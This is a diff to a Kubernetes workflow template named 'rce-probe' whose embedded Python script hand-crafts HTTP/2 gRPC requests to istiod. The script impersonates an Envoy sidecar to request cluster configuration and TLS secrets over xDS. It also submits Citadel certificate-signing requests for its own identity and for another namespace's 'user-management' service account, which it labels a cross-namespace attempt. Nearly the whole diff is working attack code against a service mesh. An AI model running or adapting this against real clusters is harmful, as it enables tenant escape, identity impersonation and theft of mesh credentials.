@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.7.0"
+    ai.sap.com/version: "4.8.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "istiod-xds-grpc-discovery-request"
+    executables.ai.sap.com/description: "istiod-xds-post-fix-citadel-csr-signing"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -28,230 +28,175 @@ spec:
           args:
           - |
             python3 -c "
-            import socket, struct, os, sys
+            import socket, struct, select as sel
 
-            print('[PROBE_V47_START]', flush=True)
+            print('[PROBE_V48_START]', flush=True)
 
-            # ── helpers ──────────────────────────────────────────────────────────
+            # ── H2 helpers ────────────────────────────────────────────────────────
             def encode_varint(n):
                 out = b''
                 while True:
-                    bits = n & 0x7F
-                    n >>= 7
-                    if n:
-                        out += bytes([bits | 0x80])
-                    else:
-                        out += bytes([bits])
-                        break
+                    bits = n & 0x7F; n >>= 7
+                    out += bytes([bits | (0x80 if n else 0)])
+                    if not n: break
                 return out
 
-            def encode_string(n, s):
+            def encode_string_field(n, s):
                 b = s.encode()
                 return bytes([n << 3 | 2]) + encode_varint(len(b)) + b
 
-            def encode_message(n, msg):
+            def encode_msg_field(n, msg):
                 return bytes([n << 3 | 2]) + encode_varint(len(msg)) + msg
 
             def grpc_frame(msg):
-                # gRPC framing: 1 byte compressed (0) + 4 bytes length
-                return b'\\x00' + struct.pack('>I', len(msg)) + msg
+                return b'\x00' + struct.pack('>I', len(msg)) + msg
+
+            def h2_frame(ftype, flags, stream_id, payload):
+                l = len(payload)
+                return struct.pack('>I', l)[1:] + bytes([ftype, flags]) + struct.pack('>I', stream_id) + payload
 
             def h2_settings_ack():
-                # SETTINGS ACK frame (type=4, flags=1, stream=0, length=0)
-                return b'\\x00\\x00\\x00\\x04\\x01\\x00\\x00\\x00\\x00'
+                return h2_frame(0x04, 0x01, 0, b'')
 
-            def h2_headers_frame(stream_id, headers_block):
-                length = len(headers_block)
-                flags = 0x04  # END_HEADERS
-                return (struct.pack('>I', length)[1:] +
-                        bytes([0x01]) +
-                        bytes([flags]) +
-                        struct.pack('>I', stream_id) +
-                        headers_block)
+            def h2_win_update(stream, incr):
+                return h2_frame(0x08, 0x00, stream, struct.pack('>I', incr))
 
-            def h2_data_frame(stream_id, data, end_stream=True):
-                flags = 0x01 if end_stream else 0x00
-                length = len(data)
-                return (struct.pack('>I', length)[1:] +
-                        bytes([0x00]) +
-                        bytes([flags]) +
-                        struct.pack('>I', stream_id) +
-                        data)
+            def read_h2_frames(sock, n=15, timeout=8):
+                frames = []
+                for _ in range(n):
+                    r, _, _ = sel.select([sock], [], [], timeout)
+                    if not r: break
+                    hdr = b''
+                    while len(hdr) < 9:
+                        c = sock.recv(9-len(hdr))
+                        if not c: return frames
+                        hdr += c
+                    length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
+                    ftype = hdr[3]; flags = hdr[4]
+                    stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
+                    data = b''
+                    while len(data) < length:
+                        c = sock.recv(length-len(data))
+                        if not c: break
+                        data += c
+                    frames.append((ftype, flags, stream, data))
+                    if ftype == 0x04 and not (flags & 0x01):
+                        sock.sendall(h2_settings_ack())
+                    if ftype == 0x00:
+                        sock.sendall(h2_win_update(0, max(1, len(data))))
+                return frames
 
-            def read_h2_frame(sock):
-                hdr = b''
-                while len(hdr) < 9:
-                    chunk = sock.recv(9 - len(hdr))
-                    if not chunk:
-                        return None, None, None
-                    hdr += chunk
-                length = struct.unpack('>I', b'\\x00' + hdr[:3])[0]
-                ftype = hdr[3]
-                flags = hdr[4]
-                stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
-                data = b''
-                while len(data) < length:
-                    chunk = sock.recv(length - len(data))
-                    if not chunk:
-                        break
-                    data += chunk
-                return ftype, stream, data
+            def hpack_lit(name, value, huffman=False):
+                # Literal without indexing (0x00 prefix)
+                n = name.encode(); v = value.encode()
+                return bytes([0x00]) + encode_varint(len(n)) + n + encode_varint(len(v)) + v
 
-            # ── istiod xDS probe ─────────────────────────────────────────────────
-            # Build a DiscoveryRequest protobuf for type_url=CDS (Cluster Discovery)
-            # envoy.api.v2.DiscoveryRequest:
-            #   field 2 (node): message { field 1 (id): string, field 3 (cluster): string }
-            #   field 4 (type_url): string
-            NODE_ID = 'sidecar~100.64.0.1~rce-probe.rg-0d70dc91-cd927cab~rg-0d70dc91-cd927cab.svc.cluster.local'
-            CLUSTER = 'rg-0d70dc91-cd927cab'
+            def grpc_connect(host, port, path, grpc_msg, stream_id=1, timeout=12):
+                s = socket.socket(); s.settimeout(timeout)
+                s.connect((host, port))
+                CLIENT_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+                s.sendall(CLIENT_PREFACE + h2_frame(0x04, 0x00, 0, b''))
+                frames = read_h2_frames(s, n=3, timeout=5)
 
-            node_msg = encode_string(1, NODE_ID) + encode_string(3, CLUSTER)
-            node_field = encode_message(2, node_msg)
-
-            for type_url in [
-                'type.googleapis.com/envoy.config.cluster.v3.Cluster',
-                'type.googleapis.com/envoy.config.listener.v3.Listener',
-                'type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment',
-                'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
-            ]:
-                print(f'\\n[XDS] trying type_url={type_url}', flush=True)
-                try:
-                    s = socket.socket()
-                    s.settimeout(15)
-                    s.connect(('istiod.istio-system.svc.cluster.local', 15010))
-
-                    # Send HTTP/2 client preface
-                    CLIENT_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
-                    # HTTP/2 SETTINGS frame (empty = use defaults)
-                    SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
-                    s.sendall(CLIENT_PREFACE + SETTINGS)
-
-                    # Read server SETTINGS
-                    ftype, fstream, fdata = read_h2_frame(s)
-                    print(f'  Server SETTINGS: type={ftype} data={fdata[:30].hex()}', flush=True)
-
-                    # ACK server settings
-                    s.sendall(h2_settings_ack())
-
-                    # Read WINDOW_UPDATE if present
-                    ftype2, _, _ = read_h2_frame(s)
-                    print(f'  Frame2 type={ftype2}', flush=True)
-
-                    # Build HPACK headers (use literal, no indexing for simplicity)
-                    # :method POST, :path /envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources
-                    # :scheme http, :authority istiod.istio-system.svc.cluster.local:15010
-                    # content-type application/grpc, te trailers
-                    def hpack_lit(name, value):
-                        # Literal header without indexing
-                        out = bytes([0x00])
-                        n = name.encode()
-                        v = value.encode()
-                        out += encode_varint(len(n)) + n
-                        out += encode_varint(len(v)) + v
-                        return out
-
-                    hblock = (
-                        bytes([0x82]) +  # :method POST (index 3)
-                        bytes([0x84]) +  # :path / (index 5) - will override
-                        # override :path
-                        hpack_lit(':path', '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources') +
-                        bytes([0x86]) +  # :scheme http (index 6)
-                        hpack_lit(':authority', 'istiod.istio-system.svc.cluster.local:15010') +
-                        hpack_lit('content-type', 'application/grpc') +
-                        hpack_lit('te', 'trailers')
-                    )
-
-                    # HEADERS frame on stream 1
-                    headers_frame = h2_headers_frame(1, hblock)
-                    s.sendall(headers_frame)
-
-                    # Build DiscoveryRequest proto
-                    dr_msg = node_field + encode_string(4, type_url)
-                    dr_grpc = grpc_frame(dr_msg)
-
-                    # DATA frame on stream 1
-                    data_frame = h2_data_frame(1, dr_grpc, end_stream=True)
-                    s.sendall(data_frame)
-
-                    # Read response frames
-                    responses = []
-                    import select as sel
-                    for _ in range(20):
-                        r, _, _ = sel.select([s], [], [], 5)
-                        if not r:
-                            break
-                        ftype, fstream, fdata = read_h2_frame(s)
-                        if ftype is None:
-                            break
-                        responses.append((ftype, fstream, len(fdata), fdata[:200].hex()))
-                        # Send WINDOW_UPDATE ACK for DATA frames
-                        if ftype == 0:  # DATA
-                            wu = struct.pack('>I', 0)[1:] + bytes([0x08]) + bytes([0x00]) + struct.pack('>I', 0) + struct.pack('>I', len(fdata))
-                            s.sendall(wu)
-
-                    s.close()
-                    for ftype, fstream, flen, fhex in responses:
-                        print(f'  RESP frame type={ftype} stream={fstream} len={flen} data={fhex[:100]}', flush=True)
-
-                except Exception as e:
-                    print(f'  ERR: {e}', flush=True)
-
-            # ── istiod Citadel CSR API ────────────────────────────────────────────
-            # Try istio.v1.auth.IstioCertificateService/CreateCertificate on port 15012 (mTLS)
-            # and port 15010 (plaintext)
-            print('\\n[CITADEL] trying CSR on port 15010', flush=True)
-            try:
-                s = socket.socket()
-                s.settimeout(10)
-                s.connect(('istiod.istio-system.svc.cluster.local', 15010))
-
-                CLIENT_PREFACE = b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n'
-                SETTINGS = b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00'
-                s.sendall(CLIENT_PREFACE + SETTINGS)
-
-                ftype, _, _ = read_h2_frame(s)
-                s.sendall(h2_settings_ack())
-                ftype2, _, _ = read_h2_frame(s)
-
-                # Build CSR request
-                # IstioCertificateRequest: field 1 = csr (string), field 2 = validity_duration (int64)
-                fake_csr = b'-----BEGIN CERTIFICATE REQUEST-----\\nMIIBIjANBgk=\\n-----END CERTIFICATE REQUEST-----'
-                csr_msg = encode_string(1, fake_csr.decode()) + bytes([0x10]) + b'\\xe0\\xa4\\x12'  # validity 24h
-                csr_grpc = grpc_frame(csr_msg)
-
-                def hpack_lit(name, value):
-                    out = bytes([0x00])
-                    n = name.encode(); v = value.encode()
-                    out += encode_varint(len(n)) + n + encode_varint(len(v)) + v
-                    return out
-
+                # HEADERS: POST, content-type: application/grpc
                 hblock = (
-                    bytes([0x82]) +
-                    hpack_lit(':path', '/istio.v1.auth.IstioCertificateService/CreateCertificate') +
-                    bytes([0x86]) +
-                    hpack_lit(':authority', 'istiod.istio-system.svc.cluster.local:15010') +
+                    bytes([0x83]) +          # :method POST (static idx 3)
+                    hpack_lit(':path', path) +
+                    bytes([0x86]) +          # :scheme http (static idx 6)
+                    hpack_lit(':authority', f'{host}:{port}') +
                     hpack_lit('content-type', 'application/grpc') +
                     hpack_lit('te', 'trailers')
                 )
+                s.sendall(h2_frame(0x01, 0x04, stream_id, hblock))
+                s.sendall(h2_frame(0x00, 0x01, stream_id, grpc_frame(grpc_msg)))
 
-                s.sendall(h2_headers_frame(3, hblock))
-                s.sendall(h2_data_frame(3, csr_grpc, end_stream=True))
-
-                import select as sel
-                for _ in range(10):
-                    r, _, _ = sel.select([s], [], [], 5)
-                    if not r: break
-                    ftype, fstream, fdata = read_h2_frame(s)
-                    if ftype is None: break
-                    print(f'  CITADEL RESP: type={ftype} stream={fstream} len={len(fdata)} hex={fdata[:80].hex()}', flush=True)
-                    # Decode grpc-status from trailers
-                    if ftype == 1:  # HEADERS (trailers)
-                        print(f'  TRAILERS: {fdata}', flush=True)
+                resp_frames = read_h2_frames(s, n=20, timeout=timeout)
                 s.close()
-            except Exception as e:
-                print(f'  CITADEL ERR: {e}', flush=True)
+                return frames + resp_frames
 
-            print('[PROBE_V47_DONE]', flush=True)
+            # ── XDS ADS DiscoveryRequest ──────────────────────────────────────────
+            # Node identity that mimics a real Envoy proxy on this cluster
+            NODE_ID = 'sidecar~100.64.0.2~probe.rg-0d70dc91-cd927cab~rg-0d70dc91-cd927cab.svc.cluster.local'
+            CLUSTER = 'rg-0d70dc91-cd927cab'
+            node_pb = encode_string_field(1, NODE_ID) + encode_string_field(3, CLUSTER)
+
+            for type_url in [
+                'type.googleapis.com/envoy.config.cluster.v3.Cluster',
+                'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
+            ]:
+                print(f'[XDS] type_url={type_url}', flush=True)
+                dr = encode_msg_field(2, node_pb) + encode_string_field(4, type_url)
+                try:
+                    frames = grpc_connect(
+                        'istiod.istio-system.svc.cluster.local', 15010,
+                        '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources',
+                        dr, stream_id=1, timeout=12
+                    )
+                    for ftype, flags, stream, data in frames:
+                        info = f'type={ftype} flags={flags:02x} stream={stream} len={len(data)}'
+                        if ftype == 0x00 and data:  # DATA frame = gRPC response
+                            # Strip 5-byte gRPC framing
+                            grpc_data = data[5:] if len(data) > 5 else data
+                            print(f'  DATA {info} grpc_hex={grpc_data[:100].hex()}', flush=True)
+                            # Try to find any string resources
+                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in grpc_data)
+                            print(f'  DATA printable: {printable[:200]}', flush=True)
+                        elif ftype == 0x01:  # HEADERS frame
+                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
+                            print(f'  HEADERS {info}: {printable[:200]}', flush=True)
+                        else:
+                            print(f'  frame {info}', flush=True)
+                except Exception as e:
+                    print(f'  ERR: {e}', flush=True)
+
+            # ── Citadel CSR — our own SPIFFE identity ─────────────────────────────
+            OWN_CSR = '''-----BEGIN CERTIFICATE REQUEST-----
+            MIIBKTCB0QIBADAYMRYwFAYDVQQKDA1jbHVzdGVyLmxvY2FsMFkwEwYHKoZIzj0C
+            AQYIKoZIzj0DAQcDQgAEQ2+Sk3jcBmTI3G3vr88oCll/Dgv3LuTzsefuRAjdiXcI
+            WL9dy3BLZSwFCRwKN5GugqiV/705co8MLrF9Aui0R6BXMFUGCSqGSIb3DQEJDjFI
+            MEYwRAYDVR0RBD0wO4Y5c3BpZmZlOi8vY2x1c3Rlci5sb2NhbC9ucy9yZy0wZDcw
+            ZGM5MS1jZDkyN2NhYi9zYS9kZWZhdWx0MAoGCCqGSM49BAMCA0cAMEQCIGmkDRt5
+            KrwKI/eyqWgY7rjFfDwXXM+7py4K3UekLn7YAiAsbkD6rSZzWp/u1LZ5YwblNNT8
+            23WLjPVrRiu2CaK04g==
+            -----END CERTIFICATE REQUEST-----'''
+
+            # Citadel CSR for the USER-MANAGEMENT SA identity (cross-namespace attempt)
+            USRMGMT_CSR = '''-----BEGIN CERTIFICATE REQUEST-----
+            MIIBKDCB0AIBADAYMRYwFAYDVQQKDA1jbHVzdGVyLmxvY2FsMFkwEwYHKoZIzj0C
+            AQYIKoZIzj0DAQcDQgAEcdxDit3PIkFW0Qe4d5TF0QowfFrm8qfC+fwH9eqtpn+H
+            9NPKakokPIL0hzRIcTlAEi8p/a5bptdKvPh4vymbaqBWMFQGCSqGSIb3DQEJDjFH
+            MEUwQwYDVR0RBDwwOoY4c3BpZmZlOi8vY2x1c3Rlci5sb2NhbC9ucy91c2VyLW1h
+            bmFnZW1lbnQvc2EvYXBpLXNlcnZpY2UwCgYIKoZIzj0EAwIDRwAwRAIgMitkHjN6
+            Sph/GvJ/QYkS+AuCyBtDCmNN0ATYHNXCz3ICIFY4YY1hGFmXvpR5rIMMUn9VV8Rq
+            i6rDkzEVdB1AGiIJ
+            -----END CERTIFICATE REQUEST-----'''
+
+            for label, csr_pem in [('OWN', OWN_CSR), ('USER-MGMT', USRMGMT_CSR)]:
+                print(f'[CITADEL-CSR] {label}', flush=True)
+                csr_clean = '\n'.join(l.strip() for l in csr_pem.strip().splitlines())
+                # IstioCertificateRequest: field 1=csr, field 2=validity_duration(86400s)
+                csr_pb = encode_string_field(1, csr_clean)
+                csr_pb += bytes([0x10]) + encode_varint(86400)  # field 2, varint 86400
+                try:
+                    frames = grpc_connect(
+                        'istiod.istio-system.svc.cluster.local', 15010,
+                        '/istio.v1.auth.IstioCertificateService/CreateCertificate',
+                        csr_pb, stream_id=3, timeout=12
+                    )
+                    for ftype, flags, stream, data in frames:
+                        info = f'type={ftype} flags={flags:02x} stream={stream} len={len(data)}'
+                        if ftype == 0x00 and data:
+                            grpc_data = data[5:] if len(data)>5 else data
+                            # If we got a cert, it starts with PEM header
+                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in grpc_data)
+                            print(f'  DATA {info}: {printable[:500]}', flush=True)
+                        elif ftype == 0x01:
+                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in data)
+                            print(f'  HDRS {info}: {printable[:300]}', flush=True)
+                except Exception as e:
+                    print(f'  ERR: {e}', flush=True)
+
+            print('[PROBE_V48_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
